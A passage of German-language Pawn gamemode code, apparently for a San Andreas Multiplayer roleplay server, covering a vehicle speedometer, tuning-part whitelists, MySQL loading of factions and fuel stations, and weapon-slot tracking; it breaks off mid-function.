public Speedometer(playerid)
{
	if(IsPlayerInAnyVehicle(playerid))
	{
//	    TextDrawHideForPlayer(playerid, ServerN);
		new vehicleid,Float:speed_x,Float:speed_y,Float:speed_z,Float:final_speed,speed_string[256],final_speed_int, Float:chealth;
		vehicleid = GetPlayerVehicleID(playerid);
		GetVehicleVelocity(vehicleid,speed_x,speed_y,speed_z);
		final_speed = floatsqroot(((speed_x*speed_x)+(speed_y*speed_y))+(speed_z*speed_z))*175; // 136.666667 = kmph  // 85.4166672= mph
		final_speed_int = floatround(final_speed,floatround_round);
		GetVehicleHealth(vehicleid, chealth);
	 	new LocationZone[MAX_ZONE_NAME];
	  	GetPlayer2DZone(playerid, LocationZone, MAX_ZONE_NAME);

		new fahrzeug = GetPlayerVehicleID(playerid);
		if(IsADtCar(fahrzeug))
		{
			new carowner = GetDtCarOwner(fahrzeug);
			new slot = GetDtCarOwnerSlot(carowner,fahrzeug);
			if(PlayerCar[carowner][slot][LPG] == 0)
			{
//			new carowner = GetDtCarOwner(fahrzeug);
//			new slot = GetDtCarOwnerSlot(carowner,fahrzeug);
			format(speed_string,200,"~B~Fahrzeug: ~W~%s~n~~B~Km/h: ~W~%d km/h~n~~B~Zustand: ~W~%d%%~n~~B~Benzin: ~W~%dl/%dl~n~~B~GPS: ~W~%s",VehicleName[GetVehicleModel(vehicleid)-400], final_speed_int, floatround(chealth, floatround_round)/10, PlayerCar[carowner][slot][Benzin],GetGasMax(GetVehicleModel(vehicleid)), LocationZone);
			TextDrawSetString(Speedo[playerid], speed_string);
			}
			if(PlayerCar[carowner][slot][LPG] == 1)
			{
//			new carowner = GetDtCarOwner(fahrzeug);
//			new slot = GetDtCarOwnerSlot(carowner,fahrzeug);
			format(speed_string,200,"~B~Fahrzeug: ~W~%s~n~~B~Km/h: ~W~%d km/h~n~~B~Zustand: ~W~%d%%~n~~B~LPG: ~W~%dl/%dl~n~~B~GPS: ~W~%s",VehicleName[GetVehicleModel(vehicleid)-400], final_speed_int, floatround(chealth, floatround_round)/10, PlayerCar[carowner][slot][Benzin],GetGasMax(GetVehicleModel(vehicleid)), LocationZone);
			TextDrawSetString(Speedo[playerid], speed_string);
			}
		}
		else for(new fc;fc<sizeof(FactionCars);fc++)
		{
			if(FactionCars[fc][fVehid] >= 400 && FactionCars[fc][fVehid] <= 611)
			{
				if(fahrzeug == FactionCars[fc][fCarid])
				{
					format(speed_string,200,"~B~Fahrzeug: ~W~%s~n~~B~Km/h: ~W~%d km/h~n~~B~Zustand: ~W~%d%%~n~~B~Benzin: ~W~%dl/%dl~n~~B~GPS: ~W~%s",VehicleName[GetVehicleModel(vehicleid)-400], final_speed_int, floatround(chealth, floatround_round)/10, FactionCars[fc][fTuning][16],GetGasMax(GetVehicleModel(vehicleid)), LocationZone);
					TextDrawSetString(Speedo[playerid], speed_string);
				}
			}
		}
		// Kilometer by CoL Team
		new string[128];
	    if(IsADtCar(fahrzeug))
	    {
			new carowner = GetDtCarOwner(fahrzeug);
	        new slot = GetDtCarOwnerSlot(carowner,fahrzeug);
	 	    format(string,sizeof(string),"~B~KM-Stand:~W~ %i",PlayerCar[carowner][slot][Kilometer]);
	  	    TextDrawSetString(tacho[playerid],string);
	 	}
	    else for(new fc;fc<sizeof(FactionCars);fc++)
		{
		    if(FactionCars[fc][fVehid] >= 400 && FactionCars[fc][fVehid] <= 611)
			{
		        if(fahrzeug == FactionCars[fc][fCarid])
				{
				 	format(string,sizeof(string),"~B~KM-Stand:~W~ %i",FactionCars[fc][fTuning][15]);
				    TextDrawSetString(tacho[playerid],string);
		  		}
		    }
		}
	}
    return 1;// String beim austeigen clearen
}
Function IsAMuellFahrzeug(carid)
{
	for(new i = 0; i < sizeof(MuellFahrzeug); i++)
   	{
		if(carid == MuellFahrzeug[i])
  		{
        	return 1;
  		}
   	}
   	return 0;
}
Function IsATaxiFahrzeug(carid)
{
	for(new i = 0; i < sizeof(TaxiVehs); i++)
   	{
		if(carid == TaxiVehs[i])
  		{
        	return 1;
  		}
   	}
   	return 0;
}
Function IsAKartFahrzeug(carid)
{
	for(new i = 0; i < sizeof(KartFahrzeug); i++)
   	{
		if(carid == KartFahrzeug[i])
  		{
        	return 1;
  		}
   	}
   	return 0;
}
forward loginkick(playerid);
public loginkick(playerid)
{
    if(gPlayerLogged[playerid] == 0)
    {
	SendClientMessage(playerid, COLOR_GRAD2, "Du wurdest vom Server gekickt da du dich nicht eingeloggt hast!");
	SetTimerEx("kicktimer", 300,false,"i",playerid);
   	}
    return 1;
}
forward otor1close();
public otor1close()
{
	MoveDynamicObject(otor1,923.48230, -1216.51563, 18.70460,3.0);
	MoveDynamicObject(otor2,923.47284, -1225.36877, 18.70460,3.0);
	return 1;
}

// Table of legit mods (minus NOS, hydraulic and wheels) for specific vehicles.
new legalmods[48][22] =
{
		{400, 1024,1021,1020,1019,1018,1013,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
		{401, 1145,1144,1143,1142,1020,1019,1017,1013,1007,1006,1005,1004,1003,1001,0000,0000,0000,0000},
		{404, 1021,1020,1019,1017,1016,1013,1007,1002,1000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
		{405, 1023,1021,1020,1019,1018,1014,1001,1000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
		{410, 1024,1023,1021,1020,1019,1017,1013,1007,1003,1001,0000,0000,0000,0000,0000,0000,0000,0000},
		{415, 1023,1019,1018,1017,1007,1003,1001,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
		{418, 1021,1020,1016,1006,1002,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
		{420, 1021,1019,1005,1004,1003,1001,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
		{421, 1023,1021,1020,1019,1018,1016,1014,1000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
		{422, 1021,1020,1019,1017,1013,1007,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
		{426, 1021,1019,1006,1005,1004,1003,1001,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
		{436, 1022,1021,1020,1019,1017,1013,1007,1006,1003,1001,0000,0000,0000,0000,0000,0000,0000,0000},
		{439, 1145,1144,1143,1142,1023,1017,1013,1007,1003,1001,0000,0000,0000,0000,0000,0000,0000,0000},
		{477, 1021,1020,1019,1018,1017,1007,1006,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
		{478, 1024,1022,1021,1020,1013,1012,1005,1004,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
		{489, 1024,1020,1019,1018,1016,1013,1006,1005,1004,1002,1000,0000,0000,0000,0000,0000,0000,0000},
		{491, 1145,1144,1143,1142,1023,1021,1020,1019,1018,1017,1014,1007,1003,0000,0000,0000,0000,0000},
		{492, 1016,1006,1005,1004,1000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
		{496, 1143,1142,1023,1020,1019,1017,1011,1007,1006,1003,1002,1001,0000,0000,0000,0000,0000,0000},
		{500, 1024,1021,1020,1019,1013,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
		{516, 1021,1020,1019,1018,1017,1016,1015,1007,1004,1002,1000,0000,0000,0000,0000,0000,0000,0000},
		{517, 1145,1144,1143,1142,1023,1020,1019,1018,1017,1016,1007,1003,1002,0000,0000,0000,0000,0000},
		{518, 1145,1144,1143,1142,1023,1020,1018,1017,1013,1007,1006,1005,1003,1001,0000,0000,0000,0000},
		{527, 1021,1020,1018,1017,1015,1014,1007,1001,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
		{529, 1023,1020,1019,1018,1017,1012,1011,1007,1006,1003,1001,0000,0000,0000,0000,0000,0000,0000},
		{534, 1185,1180,1179,1178,1127,1126,1125,1124,1123,1122,1106,1101,1100,0000,0000,0000,0000,0000},
		{535, 1121,1120,1119,1118,1117,1116,1115,1114,1113,1110,1109,0000,0000,0000,0000,0000,0000,0000},
		{536, 1184,1183,1182,1181,1128,1108,1107,1105,1104,1103,0000,0000,0000,0000,0000,0000,0000,0000},
		{540, 1145,1144,1143,1142,1024,1023,1020,1019,1018,1017,1007,1006,1004,1001,0000,0000,0000,0000},
		{542, 1145,1144,1021,1020,1019,1018,1015,1014,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
		{546, 1145,1144,1143,1142,1024,1023,1019,1018,1017,1007,1006,1004,1002,1001,0000,0000,0000,0000},
		{547, 1143,1142,1021,1020,1019,1018,1016,1003,1000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
		{549, 1145,1144,1143,1142,1023,1020,1019,1018,1017,1012,1011,1007,1003,1001,0000,0000,0000,0000},
		{550, 1145,1144,1143,1142,1023,1020,1019,1018,1006,1005,1004,1003,1001,0000,0000,0000,0000,0000},
		{551, 1023,1021,1020,1019,1018,1016,1006,1005,1003,1002,0000,0000,0000,0000,0000,0000,0000,0000},
		{558, 1168,1167,1166,1165,1164,1163,1095,1094,1093,1092,1091,1090,1089,1088,0000,0000,0000,0000},
		{559, 1173,1162,1161,1160,1159,1158,1072,1071,1070,1069,1068,1067,1066,1065,0000,0000,0000,0000},
		{560, 1170,1169,1141,1140,1139,1138,1033,1032,1031,1030,1029,1028,1027,1026,0000,0000,0000,0000},
		{561, 1157,1156,1155,1154,1064,1063,1062,1061,1060,1059,1058,1057,1056,1055,1031,1030,1027,1026},
		{562, 1172,1171,1149,1148,1147,1146,1041,1040,1039,1038,1037,1036,1035,1034,0000,0000,0000,0000},
		{565, 1153,1152,1151,1150,1054,1053,1052,1051,1050,1049,1048,1047,1046,1045,0000,0000,0000,0000},
		{567, 1189,1188,1187,1186,1133,1132,1131,1130,1129,1102,0000,0000,0000,0000,0000,0000,0000,0000},
		{575, 1177,1176,1175,1174,1099,1044,1043,1042,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
		{576, 1193,1192,1191,1190,1137,1136,1135,1134,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
		{580, 1023,1020,1018,1017,1007,1006,1001,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
		{589, 1145,1144,1024,1020,1018,1017,1016,1013,1007,1006,1005,1004,1000,0000,0000,0000,0000,0000},
		{600, 1022,1020,1018,1017,1013,1007,1006,1005,1004,0000,0000,0000,0000,0000,0000,0000,0000,0000},
		{603, 1145,1144,1143,1142,1024,1023,1020,1019,1018,1017,1007,1006,1001,0000,0000,0000,0000,0000}
};
iswheelmodel(modelid)
{
	new wheelmodels[17] = {1025,1073,1074,1075,1076,1077,1078,1079,1080,1081,1082,1083,1084,1085,1096,1097,1098};
	for (new I = 0; I != sizeof (wheelmodels); ++I){
	if (modelid == wheelmodels[I])
	return true;
	}
	return false;
}
IllegalCarNitroIde(carmodel)
{
	new illegalvehs[29] = { 581, 523, 462, 521, 463, 522, 461, 448, 468, 586, 509, 481, 510, 472, 473, 493, 595, 484, 430, 453, 452, 446, 454, 590, 569, 537, 538, 570, 449 };
	for (new I = 0; I != sizeof (illegalvehs); ++I)
	{
		if (carmodel == illegalvehs[I])
		return true;

	}
	return false;
}
// assumes player is in a car - make sure it is.
/*
illegal_nos_vehicle(PlayerID)
{
	new carid = GetPlayerVehicleID(PlayerID);
	new playercarmodel = GetVehicleModel(carid);
	return IllegalCarNitroIde(playercarmodel);
}
*/
stock islegalcarmod(vehicleide, componentid)
{
	new modok = false;
	// stereo, hydraulics & nos (1x 2x 3x) are special.
	if ( (iswheelmodel(componentid)) || (componentid == 1086) || (componentid == 1087) || ((componentid >= 1008) && (componentid <= 1010)))
	{
		new nosblocker = IllegalCarNitroIde(vehicleide);
		if (!nosblocker)
		modok = true;
	}
	else
	{
		for (new I = 0; I != sizeof (legalmods); ++I)
		{
			if (legalmods[I][0] == vehicleide)
			{ // first is car IDE

				for(new J = 1; J < 22; J++)
				{ // start with 1
					if (legalmods[I][J] == componentid)
					modok = true;
				}
			}
		}
	}
	return modok;
}
Function MoveGateBack(obj, Float:x, Float:y, Float:z)return MoveDynamicObject(obj, x, y, z, 1.5);

forward EndAntiSpawnKill(playerid);
public EndAntiSpawnKill(playerid)
{
//	SetPlayerHealth(playerid, 100);
	SetPlayerHealth(playerid, 50+PlayerInfo[playerid][pSHealth]);
    return 1;
}
public OnPlayerUpdate(playerid)
{

	CheckWeapons(playerid);
    if(Desktop_Timer_Started[playerid] == 0)
    {
        Desktop_Timer[playerid] = SetTimerEx("Desktop_Function",1000,1,"d",playerid);
        Desktop_Timer_Started[playerid] = 1;
    }
    Desktop_Check[playerid] += 1;



		Tick[playerid]++;
		if(Tick[playerid] != 12)
		{
		return 1;
	    }

		Tick[playerid] = 0;
 		new KeysF,up,down;
 		GetPlayerKeys(playerid,KeysF,up,down);
		new Float:fertx,Float:fertxy,Float:fertxz;

		if(KeysF &= 8)
		{
			if(IsPlayerInAnyVehicle(playerid))
			{
				  new vehicleid,Float:speed_x,Float:speed_y,Float:speed_z,Float:final_speed,final_speed_int;
				  vehicleid = GetPlayerVehicleID(playerid);
			      GetVehicleVelocity(vehicleid,speed_x,speed_y,speed_z);
				  final_speed = floatsqroot(((speed_x*speed_x)+(speed_y*speed_y))+(speed_z*speed_z))*175; // 136.666667 = kmph  // 85.4166672= mph
				  final_speed_int = floatround(final_speed,floatround_round);

				  if(final_speed_int > 99)
				  {
					  if(IsADtCar(vehicleid))// Privatfahrzeug
	   				  {


						 new carowner = GetDtCarOwner(vehicleid);
		                 new slot = GetDtCarOwnerSlot(carowner,vehicleid);
						 if (PlayerCar[carowner][slot][CarTurbo] == 1)
						 {
								if(final_speed_int > 800)
								{
									GetVehicleVelocity(GetPlayerVehicleID(playerid),fertx,fertxy,fertxz);
									SetVehicleVelocity(GetPlayerVehicleID(playerid),fertx*1.6,fertxy*1.6,fertxz*1.6);

									if(final_speed_int > 2500)
									{
										GetVehicleVelocity(GetPlayerVehicleID(playerid),fertx,fertxy,fertxz);
										SetVehicleVelocity(GetPlayerVehicleID(playerid),fertx*2.0,fertxy*2.0,fertxz*2.0);
										if(final_speed_int > 6000)
										{
											GetVehicleVelocity(GetPlayerVehicleID(playerid),fertx,fertxy,fertxz);
											SetVehicleVelocity(GetPlayerVehicleID(playerid),fertx*2.6,fertxy*2.6,fertxz*2.6);
											return 1;
										}
										return 1;
									}
									return 1;
								}
								GetVehicleVelocity(GetPlayerVehicleID(playerid),fertx,fertxy,fertxz);
								SetVehicleVelocity(GetPlayerVehicleID(playerid),fertx*1.2,fertxy*1.2,fertxz*1.2);
						}
					}
				}
			}
		}


	return 1;
}
forward Desktop_Function(playerid);
public Desktop_Function(playerid)
{
        if(Desktop_Check[playerid] > 0)
		{
		Desktop_Status[playerid] = 0;
		}
        if(Desktop_Check[playerid] <= 0)
		{
		Desktop_Status[playerid] +=1;
		}
        Desktop_Check[playerid] = 0;
        if(Desktop_Status[playerid] >= 1)
        {
			new stringxd[128];
			format(stringxd,sizeof(stringxd),"%s Ist seit %d Sekunden im Menü",GetName(playerid),Desktop_Status[playerid]);
			SetPlayerChatBubble(playerid, stringxd, COLOR_RED, 50.0, 1200);
        }
        return 1;
}
forward LoadOrg();
public LoadOrg()
{
    new query[128];

	//for(new idx=0; idx<MAX_ORGANISATIONS; idx++)
	//{
	    format(query, sizeof(query), "SELECT * FROM organisations");
	//   mysql_function_query(mysqlcon,query, true, "LoadMysqlOrg","");
	    mysql_pquery(mysqlcon, query, "LoadMysqlOrg", "");


	//}
	return 1;
}
forward LoadMysqlOrg();
public LoadMysqlOrg()
{

	new result[64];

	new rows,id;
//	cache_get_data(rows,fields);
    cache_get_row_count(rows);
	if(rows)
	{

	    for(new i; i<rows; i++)  // gscore
    	{
		   // cache_get_field_content(i,"id",result); id = strval(result);
           // OrgInfo[id][dborgid] = strval(result);

         //   id = i;
            cache_get_value_name_int(i, "id", id);

            cache_get_value_name_int(i, "id", OrgInfo[id][dborgid]);




        //    OrgInfo[id][dborgid] = strval(result);


		   // cache_get_field_content(i,"OrgName",result);
		//	strmid(OrgInfo[id][OrgName],result,0,strlen(result),sizeof(result));

			cache_get_value_name(i, "OrgName", OrgInfo[id][OrgName],128);

			cache_get_value_name(i, "OrgOwner", OrgInfo[id][OrgOwner],128);
			cache_get_value_name(i, "OrgMotto", OrgInfo[id][OrgMotto],128);

			cache_get_value_name_int(i, "OrgMech", OrgInfo[id][OrgMech]);
			cache_get_value_name_int(i, "leaderkasser", OrgInfo[id][leaderkasser]);
			cache_get_value_name_int(i, "leaderkaufer", OrgInfo[id][leaderkaufer]);
			cache_get_value_name_int(i, "membermiet", OrgInfo[id][membermiet]);
			cache_get_value_name_int(i, "leaderkicker", OrgInfo[id][leaderkicker]);
			cache_get_value_name_int(i, "OrgCreatet", OrgInfo[id][OrgCreatet]);


			OrgInfo[i][OrgValid]=1;
		/*    cache_get_field_content(i,"OrgOwner",result);
			strmid(OrgInfo[id][OrgOwner],result,0,strlen(result),sizeof(result));

		    cache_get_field_content(i,"OrgMotto",result);
			strmid(OrgInfo[id][OrgMotto],result,0,strlen(result),sizeof(result));*/
			/*

	        cache_get_field_content(i,"OrgMech",result);
	        OrgInfo[id][OrgMech] = strval(result);


	        cache_get_field_content(i,"leaderkasser",result);
	        OrgInfo[id][leaderkasser] = strval(result);

	        cache_get_field_content(i,"leaderkaufer",result);
	        OrgInfo[id][leaderkaufer] = strval(result);

	        cache_get_field_content(i,"membermiet",result);
	        OrgInfo[id][membermiet] = strval(result);

	        cache_get_field_content(i,"leaderkicker",result);
	        OrgInfo[id][leaderkicker] = strval(result);*/







//			strmid(OrgInfo[id][OrgMech],result,0,strlen(result),sizeof(result));

			//cache_get_field_content(i,"OrgCreatet",result), OrgInfo[id][OrgCreatet] = strval(result);




		}
	}
}




forward LoadFraks();
public LoadFraks()
{
    new query[128];
	for(new idx=0; idx<MAX_FRAKS; idx++)
	{
	    format(query, sizeof(query), "SELECT * FROM `frakbase` WHERE `id`='%i'", idx);
	 //   mysql_function_query(mysqlcon,query, true, "LoadMysqlFraks", "i",idx);
	    mysql_pquery(mysqlcon, query, "LoadMysqlFraks", "i",idx);
	}
	return 1;
}

forward LoadMysqlFraks(idx);
public LoadMysqlFraks(idx)
{
	new rows;
//	cache_get_data(rows,fields);
    cache_get_row_count(rows);
	if(rows)
	{
	    /*
	    cache_get_field_content(0,"fcreated",temp), FrakInfo[idx][fCreated] = strval(temp);
	    cache_get_field_content(0,"tmessage",temp), FrakInfo[idx][fMessage] = temp;

	    cache_get_field_content(0,"tentrancex",temp), FrakInfo[idx][fEntranceX] = floatstr(temp);
	    cache_get_field_content(0,"tentrancey",temp), FrakInfo[idx][fEntranceY] = floatstr(temp);
	    cache_get_field_content(0,"tentrancez",temp), FrakInfo[idx][fEntranceZ] = floatstr(temp);

	    cache_get_field_content(0,"fexitx",temp), FrakInfo[idx][fExitX] = floatstr(temp);
	    cache_get_field_content(0,"fexity",temp), FrakInfo[idx][fExitY] = floatstr(temp);
	    cache_get_field_content(0,"fexitz",temp), FrakInfo[idx][fExitZ] = floatstr(temp);
	    cache_get_field_content(0,"finterior",temp), FrakInfo[idx][fInterior] = strval(temp);

	    cache_get_field_content(0,"ffrak",temp), FrakInfo[idx][fFrak] = strval(temp);

	    cache_get_field_content(0,"fopen",temp), FrakInfo[idx][fOpen] = strval(temp);


	    cache_get_field_content(0,"tdrugprice",temp), FrakInfo[idx][fDrugsPrice] = strval(temp);// Drogen / Mats preise
	    cache_get_field_content(0,"tmatsprice",temp), FrakInfo[idx][fMatsPrice] = strval(temp);
	    cache_get_field_content(0,"tmats",temp), FrakInfo[idx][fMats] = strval(temp);
	    cache_get_field_content(0,"tdrugs",temp), FrakInfo[idx][fDrugs] = strval(temp);*/




		cache_get_value_name_int(0, "fcreated", FrakInfo[idx][fCreated]);
		cache_get_value_name(0, "tmessage", FrakInfo[idx][fMessage],128);

		cache_get_value_name_float(0, "fexitx", FrakInfo[idx][fExitX]);
		cache_get_value_name_float(0, "fexity", FrakInfo[idx][fExitY]);
		cache_get_value_name_float(0, "fexitz", FrakInfo[idx][fExitZ]);

		cache_get_value_name_float(0, "tentrancex", FrakInfo[idx][fEntranceX]);
		cache_get_value_name_float(0, "tentrancey", FrakInfo[idx][fEntranceY]);
		cache_get_value_name_float(0, "tentrancez", FrakInfo[idx][fEntranceZ]);

		cache_get_value_name_int(0, "finterior", FrakInfo[idx][fInterior]);
		cache_get_value_name_int(0, "ffrak", FrakInfo[idx][fFrak]);
		cache_get_value_name_int(0, "fopen", FrakInfo[idx][fOpen]);


		cache_get_value_name_int(0, "tdrugprice", FrakInfo[idx][fDrugsPrice]);
		cache_get_value_name_int(0, "tmatsprice", FrakInfo[idx][fMatsPrice]);
		cache_get_value_name_int(0, "tmats", FrakInfo[idx][fMats]);
        cache_get_value_name_int(0, "tdrugs", FrakInfo[idx][fDrugs]);




    	if(FrakInfo[idx][fCreated] == 1)
		{
	            format(frakbasetring, sizeof(frakbasetring), "Fraktionsbase %d\n\n%s",idx,FrakInfo[idx][fMessage]);
				FrakInfo[idx][f_text] = Create3DTextLabel(frakbasetring,0xFFFFFFAA,FrakInfo[idx][fEntranceX], FrakInfo[idx][fEntranceY], FrakInfo[idx][fEntranceZ]+1.25,15,0,1);
	   			Update3DTextLabelText(FrakInfo[idx][f_text],0xFFFFFFAA,frakbasetring);
				FrakInfo[idx][fPickup]	= CreatePickup(1318, 0, FrakInfo[idx][fEntranceX], FrakInfo[idx][fEntranceY], FrakInfo[idx][fEntranceZ]+0.25);
				pickups++;
		}

	}
}



forward LoadTanke();
public LoadTanke()
{
    new query[128];
    for(new idx=0; idx<sizeof(TankeInfo); idx++)
    {
	    format(query, sizeof(query), "SELECT * FROM `fuelstation` WHERE `id`='%i'", idx);
	//    mysql_function_query(mysqlcon,query, true, "LoadMysqlTanke", "i",idx);
	    mysql_pquery(mysqlcon, query, "LoadMysqlTanke", "i",idx);
//	    print("[ERFOLGREICH]: Tanke geladen...");
	}
	return 1;
}
forward LoadMysqlTanke(idx);
public LoadMysqlTanke(idx)
{
	new rows;
	//cache_get_data(rows,fields);
	cache_get_row_count(rows);
	if(rows)
	{
	/*
	    cache_get_field_content(0,"tcreated",temp), TankeInfo[idx][tCreated] = strval(temp);
	    cache_get_field_content(0,"towned",temp), TankeInfo[idx][tOwned] = strval(temp);
	    cache_get_field_content(0,"towner",temp), TankeInfo[idx][tOwner] = temp;
	    cache_get_field_content(0,"tmessage",temp), TankeInfo[idx][tMessage] = temp;
	    cache_get_field_content(0,"textortion",temp), TankeInfo[idx][tExtortion] = temp;
	    cache_get_field_content(0,"tentrancex",temp), TankeInfo[idx][tEntranceX] = floatstr(temp);
	    cache_get_field_content(0,"tentrancey",temp), TankeInfo[idx][tEntranceY] = floatstr(temp);
	    cache_get_field_content(0,"tentrancez",temp), TankeInfo[idx][tEntranceZ] = floatstr(temp);
	    cache_get_field_content(0,"tlevelneeded",temp), TankeInfo[idx][tLevelNeeded] = strval(temp);
	    cache_get_field_content(0,"tbuyprice",temp), TankeInfo[idx][tBuyPrice] = strval(temp);
	    cache_get_field_content(0,"tentrancecost",temp), TankeInfo[idx][tEntranceCost] = strval(temp);
	    cache_get_field_content(0,"ttill",temp), TankeInfo[idx][tTill] = strval(temp);
	    cache_get_field_content(0,"tlocked",temp), TankeInfo[idx][tLocked] = strval(temp);
	    cache_get_field_content(0,"tinterior",temp), TankeInfo[idx][tInterior] = strval(temp);
	    cache_get_field_content(0,"tproducts",temp), TankeInfo[idx][tProducts] = strval(temp);
	    cache_get_field_content(0,"tmaxproducts",temp), TankeInfo[idx][tMaxProducts] = strval(temp);
	    cache_get_field_content(0,"tpriceprod",temp), TankeInfo[idx][tPriceProd] = strval(temp);*/



	    cache_get_value_name_int(0,"tcreated",TankeInfo[idx][tCreated]);
	    cache_get_value_name_int(0,"towned",TankeInfo[idx][tOwned]);
	    cache_get_value_name(0,"towner",TankeInfo[idx][tOwner],MAX_PLAYER_NAME);
	    cache_get_value_name(0,"tmessage",TankeInfo[idx][tMessage],MAX_PLAYER_NAME);
	    cache_get_value_name(0,"textortion",TankeInfo[idx][tExtortion],128);
	    cache_get_value_name_float(0,"tentrancex",TankeInfo[idx][tEntranceX]);
	    cache_get_value_name_float(0,"tentrancey",TankeInfo[idx][tEntranceY]);
	    cache_get_value_name_float(0,"tentrancez",TankeInfo[idx][tEntranceZ]);
	    cache_get_value_name_int(0,"tlevelneeded",TankeInfo[idx][tLevelNeeded]);
	    cache_get_value_name_int(0,"tbuyprice",TankeInfo[idx][tBuyPrice]);
	    cache_get_value_name_int(0,"tentrancecost", TankeInfo[idx][tEntranceCost]);
	    cache_get_value_name_int(0,"ttill",TankeInfo[idx][tTill]);
	    cache_get_value_name_int(0,"tlocked",TankeInfo[idx][tLocked]);
	    cache_get_value_name_int(0,"tinterior",TankeInfo[idx][tInterior]);
	    cache_get_value_name_int(0,"tproducts",TankeInfo[idx][tProducts]);
	    cache_get_value_name_int(0,"tmaxproducts",TankeInfo[idx][tMaxProducts]);
	    cache_get_value_name_int(0,"tpriceprod",TankeInfo[idx][tPriceProd]);



      //  cache_get_field_content(0,"bid",temp), TankeInfo[idx][TDBID] = strval(temp);

    	if(TankeInfo[idx][tCreated] == 1)
		{

			if(TankeInfo[idx][tOwned] == 0)
			{
	            format(tankestring, sizeof(tankestring), "%s\n Diese Tankstelle steht zum Verkauf!\nPreis: $%d \nLevel: %d \nBenutze /buytanke um die Tankstelle zu kaufen",TankeInfo[idx][tMessage],TankeInfo[idx][tBuyPrice],TankeInfo[idx][tLevelNeeded]);
				TankeInfo[idx][t_text] = Create3DTextLabel(tankestring,0xFFFFFFAA,TankeInfo[idx][tEntranceX], TankeInfo[idx][tEntranceY], TankeInfo[idx][tEntranceZ]+1.25,15,0,1);
	   			Update3DTextLabelText(TankeInfo[idx][t_text],0xFFFFFFAA,tankestring);
				TankeInfo[idx][tPickup]	= AddStaticPickup(1272, 0, TankeInfo[idx][tEntranceX], TankeInfo[idx][tEntranceY], TankeInfo[idx][tEntranceZ]+0.25);
				pickups++;
			}
			if(TankeInfo[idx][tOwned] == 1)
			{
	            format(tankestring, sizeof(tankestring), "%s\nInhaber: %s\nTeilhaber: %s\nPreis pro Liter: $%d \nBenzinlager: %dl\nLevel: %d\n\nTanken mit /fill",TankeInfo[idx][tMessage],TankeInfo[idx][tOwner],TankeInfo[idx][tExtortion],TankeInfo[idx][tEntranceCost],TankeInfo[idx][tProducts],TankeInfo[idx][tLevelNeeded]);
				TankeInfo[idx][t_text] = Create3DTextLabel(tankestring,0xFFFFFFAA,TankeInfo[idx][tEntranceX], TankeInfo[idx][tEntranceY], TankeInfo[idx][tEntranceZ]+1.25,15,0,1);
	   			Update3DTextLabelText(TankeInfo[idx][t_text],0xFFFFFFAA,tankestring);
				TankeInfo[idx][tPickup]	= AddStaticPickup(1650, 0, TankeInfo[idx][tEntranceX], TankeInfo[idx][tEntranceY], TankeInfo[idx][tEntranceZ]+0.25);//tProducts
				pickups++;
			}
		}
	}
}
Function ExtortionTanke(bizid,money)
{
    new string[256];
    format(string, sizeof(string), "Niemand");
    if(strcmp(TankeInfo[bizid][tExtortion],string, true ) == 0 )
	{
	    return 0;
	}
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
	    if(IsPlayerConnected(i))
	    {
	        new name[MAX_PLAYER_NAME];
			new wstring[MAX_PLAYER_NAME];
			GetPlayerName(i, name, sizeof(name));
			format(string, sizeof(string), "%s", name);
			strmid(wstring, string, 0, strlen(string), 255);
			if(strcmp(TankeInfo[bizid][tExtortion] ,wstring, true ) == 0 )
			{
			    new value = money / 100;
			    value = value * 10;
			    GivePlayerMoneySave(i, value);
			    TankeInfo[bizid][tTill] -= value;
			}
		}
	}
	return 1;
}
Function PrintFuelstationInfo(playerid,targetid)
{
	if(IsPlayerConnected(playerid))
	{
		new coordsstring[256];
		SendClientMessage(playerid, COLOR_GREEN,"_______________________________________");
		format(coordsstring, sizeof(coordsstring),"*** %s ***",TankeInfo[targetid][tMessage]);
		SendClientMessage(playerid, COLOR_WHITE,coordsstring);
		format(coordsstring, sizeof(coordsstring), "Verschlossen: %d Preis pro Liter: $%d Kasse: $%d Teilhaber: %s", TankeInfo[targetid][tLocked], TankeInfo[targetid][tEntranceCost], TankeInfo[targetid][tTill],TankeInfo[targetid][tExtortion]);
		SendClientMessage(playerid, COLOR_GRAD1,coordsstring);
		SendClientMessage(playerid, COLOR_GREEN,"_______________________________________");
	}
}
ServerWeapon(playerid, weaponid, ammo)
{
if(weaponid >= 1 && weaponid <= 15)
 	{
	Weaponsx[playerid][Melee] = weaponid;
	GivePlayerWeapon(playerid, weaponid, ammo);
	return 1;
	}

		if( weaponid >= 16 && weaponid <= 18 || weaponid == 39 ) // Checking Thrown
 	{
	Weaponsx[playerid][Thrown] = weaponid;
	GivePlayerWeapon(playerid, weaponid, ammo);
	return 1;
	}
	if( weaponid >= 22 && weaponid <= 24 ) // Checking Pistols
 	{
	Weaponsx[playerid][Pistols] = weaponid;
	GivePlayerWeapon(playerid, weaponid, ammo);
	return 1;
	}

	if( weaponid >= 25 && weaponid <= 27 ) // Checking Shotguns
 	{
	Weaponsx[playerid][Shotguns] = weaponid;
	GivePlayerWeapon(playerid, weaponid, ammo);
	return 1;
	}
	if( weaponid == 28 || weaponid == 29 || weaponid == 32|| weaponid == 42|| weaponid == 46 ) // Checking Sub Machine Guns
 	{
	Weaponsx[playerid][SubMachine] = weaponid;
	GivePlayerWeapon(playerid, weaponid, ammo);
	return 1;
	}

	if( weaponid == 30 || weaponid == 31 ) // Checking Assault
 	{
	Weaponsx[playerid][Assault] = weaponid;
